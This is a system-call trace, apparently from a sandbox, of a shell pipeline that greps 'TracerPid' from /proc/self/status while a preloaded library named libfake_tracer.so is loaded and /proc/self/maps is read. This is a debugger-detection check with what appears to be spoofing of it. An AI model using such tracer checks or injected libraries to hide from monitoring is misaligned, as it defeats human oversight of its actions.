11    14:56:48.728966 <... newfstatat resumed>0x7ffd8d3b00d0, 0) = -1 ENOENT (No such file or directory)
12    14:56:48.729153 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/awk",  <unfinished ...>
10    14:56:48.729335 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12    14:56:48.729521 <... newfstatat resumed>0x7ffd8d3b00d0, 0) = -1 ENOENT (No such file or directory)
11    14:56:48.729697 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/grep",  <unfinished ...>
12    14:56:48.729905 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/awk",  <unfinished ...>
10    14:56:48.730093 <... rt_sigprocmask resumed>[CHLD], 8) = 0
12    14:56:48.730302 <... newfstatat resumed>0x7ffd8d3b00d0, 0) = -1 ENOENT (No such file or directory)
11    14:56:48.730462 <... newfstatat resumed>0x7ffd8d3b00d0, 0) = -1 ENOENT (No such file or directory)
12    14:56:48.730665 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/awk",  <unfinished ...>
10    14:56:48.730856 rt_sigaction(SIGINT, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
12    14:56:48.731227 <... newfstatat resumed>0x7ffd8d3b00d0, 0) = -1 ENOENT (No such file or directory)
11    14:56:48.731455 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/grep",  <unfinished ...>
12    14:56:48.731645 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/awk",  <unfinished ...>
10    14:56:48.731836 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
12    14:56:48.732031 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=170768, ...}, 0) = 0
11    14:56:48.732235 <... newfstatat resumed>0x7ffd8d3b00d0, 0) = -1 ENOENT (No such file or directory)
12    14:56:48.732425 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/awk",  <unfinished ...>
10    14:56:48.732620 wait4(-1,  <unfinished ...>
12    14:56:48.732808 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=170768, ...}, 0) = 0
11    14:56:48.732987 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/grep",  <unfinished ...>
12    14:56:48.733189 geteuid( <unfinished ...>
11    14:56:48.733384 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=186824, ...}, 0) = 0
12    14:56:48.733579 <... geteuid resumed>) = 1001
11    14:56:48.733790 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/grep",  <unfinished ...>
12    14:56:48.734018 getegid( <unfinished ...>
11    14:56:48.734198 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=186824, ...}, 0) = 0
12    14:56:48.734402 <... getegid resumed>) = 1001
11    14:56:48.734593 geteuid( <unfinished ...>
12    14:56:48.734830 getuid( <unfinished ...>
11    14:56:48.735036 <... geteuid resumed>) = 1001
12    14:56:48.735274 <... getuid resumed>) = 1001
11    14:56:48.735457 getegid( <unfinished ...>
12    14:56:48.735633 getgid( <unfinished ...>
11    14:56:48.735816 <... getegid resumed>) = 1001
12    14:56:48.735982 <... getgid resumed>) = 1001
11    14:56:48.736172 getuid( <unfinished ...>
12    14:56:48.736360 access("/usr/bin/awk", X_OK <unfinished ...>
11    14:56:48.736558 <... getuid resumed>) = 1001
12    14:56:48.736760 <... access resumed>) = 0
11    14:56:48.736959 getgid( <unfinished ...>
12    14:56:48.737148 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/awk",  <unfinished ...>
11    14:56:48.737336 <... getgid resumed>) = 1001
12    14:56:48.737527 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=170768, ...}, 0) = 0
11    14:56:48.737726 access("/usr/bin/grep", X_OK <unfinished ...>
12    14:56:48.737935 geteuid( <unfinished ...>
11    14:56:48.738137 <... access resumed>) = 0
12    14:56:48.738344 <... geteuid resumed>) = 1001
11    14:56:48.738529 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/grep",  <unfinished ...>
12    14:56:48.738727 getegid( <unfinished ...>
11    14:56:48.738896 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=186824, ...}, 0) = 0
12    14:56:48.739086 <... getegid resumed>) = 1001
11    14:56:48.739257 geteuid( <unfinished ...>
12    14:56:48.739434 getuid( <unfinished ...>
11    14:56:48.739628 <... geteuid resumed>) = 1001
12    14:56:48.739831 <... getuid resumed>) = 1001
11    14:56:48.740028 getegid( <unfinished ...>
12    14:56:48.740214 getgid( <unfinished ...>
11    14:56:48.740392 <... getegid resumed>) = 1001
12    14:56:48.740576 <... getgid resumed>) = 1001
11    14:56:48.740774 getuid( <unfinished ...>
12    14:56:48.740961 access("/usr/bin/awk", R_OK <unfinished ...>
11    14:56:48.741160 <... getuid resumed>) = 1001
12    14:56:48.741335 <... access resumed>) = 0
11    14:56:48.741498 getgid( <unfinished ...>
12    14:56:48.741663 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
11    14:56:48.741846 <... getgid resumed>) = 1001
12    14:56:48.742042 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.742247 access("/usr/bin/grep", R_OK <unfinished ...>
12    14:56:48.742440 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
11    14:56:48.742664 <... access resumed>) = 0
12    14:56:48.742844 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.743050 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
12    14:56:48.743232 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
11    14:56:48.743421 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
12    14:56:48.743603 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.743793 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
12    14:56:48.744005 execve("/usr/bin/awk", ["awk", "{print $2}"], 0x5efc23a6e620 /* 9 vars */ <unfinished ...>
11    14:56:48.744200 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.744851 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
12    14:56:48.745081 <... execve resumed>) = 0
11    14:56:48.745319 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
12    14:56:48.745497 brk(NULL <unfinished ...>
11    14:56:48.745675 execve("/usr/bin/grep", ["grep", "-i", "TracerPid", "/proc/self/status"], 0x5efc23a6e620 /* 9 vars */ <unfinished ...>
12    14:56:48.745858 <... brk resumed>) = 0x57b795007000
12    14:56:48.746055 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7e1bbb8c4000
12    14:56:48.746439 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC <unfinished ...>
11    14:56:48.746626 <... execve resumed>) = 0
11    14:56:48.746849 brk(NULL <unfinished ...>
12    14:56:48.747040 <... openat resumed>) = 3</usr/lib/libfake_tracer.so>
11    14:56:48.747231 <... brk resumed>) = 0x56ca0e04c000
12    14:56:48.747405 read(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
11    14:56:48.747570 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    14:56:48.747769 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
11    14:56:48.747939 <... mmap resumed>) = 0x75e1b1e96000
12    14:56:48.748102 fstat(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
11    14:56:48.748274 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC <unfinished ...>
12    14:56:48.748507 <... fstat resumed>{st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
12    14:56:48.748769 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0 <unfinished ...>
11    14:56:48.748933 <... openat resumed>) = 3</usr/lib/libfake_tracer.so>
12    14:56:48.749092 <... mmap resumed>) = 0x7e1bbb8bf000
11    14:56:48.749238 read(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
12    14:56:48.749391 mmap(0x7e1bbb8c0000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000 <unfinished ...>
11    14:56:48.749580 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
12    14:56:48.749738 <... mmap resumed>) = 0x7e1bbb8c0000
11    14:56:48.749909 fstat(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
12    14:56:48.750094 mmap(0x7e1bbb8c1000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
11    14:56:48.750294 <... fstat resumed>{st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
12    14:56:48.750459 <... mmap resumed>) = 0x7e1bbb8c1000
11    14:56:48.750649 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0 <unfinished ...>
12    14:56:48.750815 mmap(0x7e1bbb8c2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
11    14:56:48.750976 <... mmap resumed>) = 0x75e1b1e91000
12    14:56:48.751123 <... mmap resumed>) = 0x7e1bbb8c2000
11    14:56:48.751269 mmap(0x75e1b1e92000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000 <unfinished ...>
12    14:56:48.751426 close(3</usr/lib/libfake_tracer.so> <unfinished ...>
11    14:56:48.751601 <... mmap resumed>) = 0x75e1b1e92000
12    14:56:48.751759 <... close resumed>) = 0
11    14:56:48.751933 mmap(0x75e1b1e93000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
12    14:56:48.752094 access("/etc/ld.so.preload", R_OK <unfinished ...>
11    14:56:48.752269 <... mmap resumed>) = 0x75e1b1e93000
12    14:56:48.752449 <... access resumed>) = -1 ENOENT (No such file or directory)
11    14:56:48.752644 mmap(0x75e1b1e94000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
12    14:56:48.752841 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
11    14:56:48.753036 <... mmap resumed>) = 0x75e1b1e94000
12    14:56:48.753244 <... openat resumed>) = 3</etc/ld.so.cache>
11    14:56:48.753436 close(3</usr/lib/libfake_tracer.so> <unfinished ...>
12    14:56:48.753643 fstat(3</etc/ld.so.cache>,  <unfinished ...>
11    14:56:48.753833 <... close resumed>) = 0
12    14:56:48.754340 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
11    14:56:48.754524 access("/etc/ld.so.preload", R_OK <unfinished ...>
12    14:56:48.754797 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0 <unfinished ...>
11    14:56:48.755006 <... access resumed>) = -1 ENOENT (No such file or directory)
12    14:56:48.755186 <... mmap resumed>) = 0x7e1bbb8bd000
11    14:56:48.755367 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
12    14:56:48.755618 close(3</etc/ld.so.cache> <unfinished ...>
11    14:56:48.755806 <... openat resumed>) = 3</etc/ld.so.cache>
12    14:56:48.756012 <... close resumed>) = 0
11    14:56:48.756206 fstat(3</etc/ld.so.cache>,  <unfinished ...>
12    14:56:48.756431 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libm.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
11    14:56:48.757036 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
12    14:56:48.757334 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libm.so.6>
11    14:56:48.757629 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0 <unfinished ...>
12    14:56:48.757912 read(3</usr/lib/x86_64-linux-gnu/libm.so.6>,  <unfinished ...>
11    14:56:48.758160 <... mmap resumed>) = 0x75e1b1e8f000
12    14:56:48.758408 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
11    14:56:48.758643 close(3</etc/ld.so.cache> <unfinished ...>
12    14:56:48.758858 fstat(3</usr/lib/x86_64-linux-gnu/libm.so.6>,  <unfinished ...>
11    14:56:48.759069 <... close resumed>) = 0
12    14:56:48.759264 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=952616, ...}) = 0
11    14:56:48.759460 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC <unfinished ...>
12    14:56:48.759689 mmap(NULL, 950296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0 <unfinished ...>
11    14:56:48.759900 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>
12    14:56:48.760099 <... mmap resumed>) = 0x7e1bbb7d4000
11    14:56:48.760297 read(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>,  <unfinished ...>
12    14:56:48.760494 mmap(0x7e1bbb7e4000, 520192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0x10000 <unfinished ...>
11    14:56:48.760677 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
12    14:56:48.760915 <... mmap resumed>) = 0x7e1bbb7e4000
11    14:56:48.761134 fstat(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>,  <unfinished ...>
12    14:56:48.761333 mmap(0x7e1bbb863000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0x8f000 <unfinished ...>
11    14:56:48.761524 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
12    14:56:48.761719 <... mmap resumed>) = 0x7e1bbb863000
11    14:56:48.761903 mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0 <unfinished ...>
12    14:56:48.762101 mmap(0x7e1bbb8bb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0xe7000 <unfinished ...>
11    14:56:48.762303 <... mmap resumed>) = 0x75e1b1df5000
12    14:56:48.762482 <... mmap resumed>) = 0x7e1bbb8bb000
11    14:56:48.762670 mmap(0x75e1b1df7000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x2000 <unfinished ...>
12    14:56:48.762904 close(3</usr/lib/x86_64-linux-gnu/libm.so.6> <unfinished ...>
11    14:56:48.763114 <... mmap resumed>) = 0x75e1b1df7000
12    14:56:48.763319 <... close resumed>) = 0
11    14:56:48.763506 mmap(0x75e1b1e65000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x70000 <unfinished ...>
12    14:56:48.763684 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
11    14:56:48.763914 <... mmap resumed>) = 0x75e1b1e65000
12    14:56:48.764090 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
11    14:56:48.764399 mmap(0x75e1b1e8d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x97000 <unfinished ...>
12    14:56:48.764585 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    14:56:48.764773 <... mmap resumed>) = 0x75e1b1e8d000
12    14:56:48.764949 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
11    14:56:48.765148 close(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2> <unfinished ...>
12    14:56:48.765319 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    14:56:48.765532 <... close resumed>) = 0
12    14:56:48.765736 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
11    14:56:48.765940 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
12    14:56:48.766177 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    14:56:48.766362 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
12    14:56:48.766554 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
11    14:56:48.766771 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    14:56:48.766989 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    14:56:48.767187 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
12    14:56:48.767383 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
11    14:56:48.767576 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    14:56:48.767763 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0 <unfinished ...>
11    14:56:48.767951 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
12    14:56:48.768150 <... mmap resumed>) = 0x7e1bbb5c2000
11    14:56:48.768337 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    14:56:48.768521 mmap(0x7e1bbb5ea000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000 <unfinished ...>
11    14:56:48.768706 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
12    14:56:48.768914 <... mmap resumed>) = 0x7e1bbb5ea000
11    14:56:48.769087 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    14:56:48.769256 mmap(0x7e1bbb772000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000 <unfinished ...>
11    14:56:48.769451 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
12    14:56:48.769636 <... mmap resumed>) = 0x7e1bbb772000
11    14:56:48.769828 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0 <unfinished ...>
12    14:56:48.770002 mmap(0x7e1bbb7c1000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000 <unfinished ...>
11    14:56:48.770197 <... mmap resumed>) = 0x75e1b1be3000
12    14:56:48.770434 <... mmap resumed>) = 0x7e1bbb7c1000
11    14:56:48.770674 mmap(0x75e1b1c0b000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000 <unfinished ...>
12    14:56:48.770858 mmap(0x7e1bbb7c7000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    14:56:48.771024 <... mmap resumed>) = 0x75e1b1c0b000
12    14:56:48.771196 <... mmap resumed>) = 0x7e1bbb7c7000
11    14:56:48.771356 mmap(0x75e1b1d93000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000 <unfinished ...>
12    14:56:48.771535 close(3</usr/lib/x86_64-linux-gnu/libc.so.6> <unfinished ...>
11    14:56:48.771720 <... mmap resumed>) = 0x75e1b1d93000
12    14:56:48.771888 <... close resumed>) = 0
11    14:56:48.772053 mmap(0x75e1b1de2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000 <unfinished ...>
12    14:56:48.772235 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    14:56:48.772392 <... mmap resumed>) = 0x75e1b1de2000
12    14:56:48.772540 <... mmap resumed>) = 0x7e1bbb5bf000
11    14:56:48.772704 mmap(0x75e1b1de8000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    14:56:48.772899 arch_prctl(ARCH_SET_FS, 0x7e1bbb5bf740 <unfinished ...>
11    14:56:48.773085 <... mmap resumed>) = 0x75e1b1de8000
12    14:56:48.773266 <... arch_prctl resumed>) = 0
11    14:56:48.773442 close(3</usr/lib/x86_64-linux-gnu/libc.so.6> <unfinished ...>
12    14:56:48.773611 set_tid_address(0x7e1bbb5bfa10 <unfinished ...>
11    14:56:48.773772 <... close resumed>) = 0
12    14:56:48.773953 <... set_tid_address resumed>) = 12
11    14:56:48.774115 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    14:56:48.774275 set_robust_list(0x7e1bbb5bfa20, 24 <unfinished ...>
11    14:56:48.774443 <... mmap resumed>) = 0x75e1b1be0000
12    14:56:48.774674 <... set_robust_list resumed>) = 0
11    14:56:48.774837 arch_prctl(ARCH_SET_FS, 0x75e1b1be0740 <unfinished ...>
12    14:56:48.774984 rseq(0x7e1bbb5c0060, 0x20, 0, 0x53053053 <unfinished ...>
11    14:56:48.775151 <... arch_prctl resumed>) = 0
12    14:56:48.775307 <... rseq resumed>) = 0
11    14:56:48.775451 set_tid_address(0x75e1b1be0a10 <unfinished ...>
12    14:56:48.775643 mprotect(0x7e1bbb7c1000, 16384, PROT_READ <unfinished ...>
11    14:56:48.775803 <... set_tid_address resumed>) = 11
12    14:56:48.775949 <... mprotect resumed>) = 0
11    14:56:48.776122 set_robust_list(0x75e1b1be0a20, 24 <unfinished ...>
12    14:56:48.776277 mprotect(0x7e1bbb8bb000, 4096, PROT_READ <unfinished ...>
11    14:56:48.776430 <... set_robust_list resumed>) = 0
12    14:56:48.776596 <... mprotect resumed>) = 0
11    14:56:48.776787 rseq(0x75e1b1be1060, 0x20, 0, 0x53053053 <unfinished ...>
12    14:56:48.776942 mprotect(0x7e1bbb8c2000, 4096, PROT_READ <unfinished ...>
11    14:56:48.777084 <... rseq resumed>) = 0
12    14:56:48.777261 <... mprotect resumed>) = 0
11    14:56:48.777428 mprotect(0x75e1b1de2000, 16384, PROT_READ <unfinished ...>
12    14:56:48.777584 mprotect(0x57b76c60b000, 4096, PROT_READ <unfinished ...>
11    14:56:48.777749 <... mprotect resumed>) = 0
12    14:56:48.777895 <... mprotect resumed>) = 0
11    14:56:48.778037 mprotect(0x75e1b1e8d000, 4096, PROT_READ <unfinished ...>
12    14:56:48.778178 mprotect(0x7e1bbb8fc000, 8192, PROT_READ <unfinished ...>
11    14:56:48.778357 <... mprotect resumed>) = 0
12    14:56:48.778538 <... mprotect resumed>) = 0
11    14:56:48.778730 mprotect(0x75e1b1e94000, 4096, PROT_READ <unfinished ...>
12    14:56:48.778908 prlimit64(0, RLIMIT_STACK, NULL,  <unfinished ...>
11    14:56:48.779068 <... mprotect resumed>) = 0
12    14:56:48.779216 <... prlimit64 resumed>{rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
11    14:56:48.779378 mprotect(0x56c9e0ad7000, 8192, PROT_READ <unfinished ...>
12    14:56:48.779528 munmap(0x7e1bbb8bd000, 7295 <unfinished ...>
11    14:56:48.779675 <... mprotect resumed>) = 0
12    14:56:48.779862 <... munmap resumed>) = 0
11    14:56:48.780011 mprotect(0x75e1b1ece000, 8192, PROT_READ <unfinished ...>
12    14:56:48.780163 getrandom( <unfinished ...>
11    14:56:48.780314 <... mprotect resumed>) = 0
12    14:56:48.780460 <... getrandom resumed>"\xd4\x6a\x77\xa0\x4c\x34\x7f\xce", 8, GRND_NONBLOCK) = 8
11    14:56:48.780639 prlimit64(0, RLIMIT_STACK, NULL,  <unfinished ...>
12    14:56:48.780787 brk(NULL <unfinished ...>
11    14:56:48.780958 <... prlimit64 resumed>{rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
12    14:56:48.781127 <... brk resumed>) = 0x57b795007000
11    14:56:48.781273 munmap(0x75e1b1e8f000, 7295 <unfinished ...>
12    14:56:48.781423 brk(0x57b795028000 <unfinished ...>
11    14:56:48.781587 <... munmap resumed>) = 0
12    14:56:48.781754 <... brk resumed>) = 0x57b795028000
11    14:56:48.781940 getrandom( <unfinished ...>
12    14:56:48.782138 mmap(NULL, 266240, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    14:56:48.782316 <... getrandom resumed>"\xc0\xbd\xb9\xb3\xf0\x6d\x9c\xe5", 8, GRND_NONBLOCK) = 8
12    14:56:48.782501 <... mmap resumed>) = 0x7e1bbb57e000
11    14:56:48.782688 brk(NULL <unfinished ...>
12    14:56:48.782851 ioctl(0<pipe:[574]>, TCGETS <unfinished ...>
11    14:56:48.783031 <... brk resumed>) = 0x56ca0e04c000
12    14:56:48.783187 <... ioctl resumed>, 0x7ffcc2ed2e80) = -1 ENOTTY (Inappropriate ioctl for device)
11    14:56:48.783356 brk(0x56ca0e06d000 <unfinished ...>
12    14:56:48.783541 read(0<pipe:[574]>,  <unfinished ...>
11    14:56:48.783724 <... brk resumed>) = 0x56ca0e06d000
11    14:56:48.784024 openat(AT_FDCWD</sandbox>, "/proc/self/maps", O_RDONLY) = 3</proc/11/maps>
11    14:56:48.784533 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x75e1b1e8f000
11    14:56:48.784981 lseek(3</proc/11/maps>, 0, SEEK_SET) = 0
11    14:56:48.785414 read(3</proc/11/maps>, "56c9e0aab000-56c9e0aaf000 r--p 0"..., 8192) = 3246
11    14:56:48.785874 read(3</proc/11/maps>, "", 4946) = 0
11    14:56:48.786271 close(3</proc/11/maps>) = 0
